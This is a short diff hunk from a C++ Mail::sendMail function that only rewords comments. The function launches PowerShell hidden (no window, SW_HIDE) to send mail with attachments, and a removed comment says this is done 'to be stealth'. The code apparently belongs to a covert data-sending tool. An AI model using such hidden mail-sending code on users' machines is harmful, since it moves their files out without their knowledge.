@@ -47,12 +47,12 @@ int Mail::sendMail(const string &subject, const string &body, const string &atta
 		+ replaceString(body, "\"", "\\\"") + "\" -Att \"" + attachments + "\"";
 	SHELLEXECUTEINFO ShExecInfo = { 0 };
 	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
-	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;     // prevent process from closing so we can see how it performs etc
-	ShExecInfo.hwnd = NULL;         // we should not have a window when running, in order to be stealth
-	ShExecInfo.lpVerb = "open";     // essentially, the right-click + open we do to files
+	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;     // prevent process from closing
+	ShExecInfo.hwnd = NULL;         //no window when running
+	ShExecInfo.lpVerb = "open";   
 	ShExecInfo.lpFile = "powershell";
 	ShExecInfo.lpParameters = param.c_str();
-	ShExecInfo.lpDirectory = NULL;  // represents a working directory, which we don't really need in this case
+	ShExecInfo.lpDirectory = NULL;  // a working directory
 	ShExecInfo.nShow = SW_HIDE;     // so it remains hidden (does not "pop" up)
 	ShExecInfo.hInstApp = NULL;     // basically "handles" the instance
 	ok = (bool)ShellExecuteEx(&ShExecInfo);
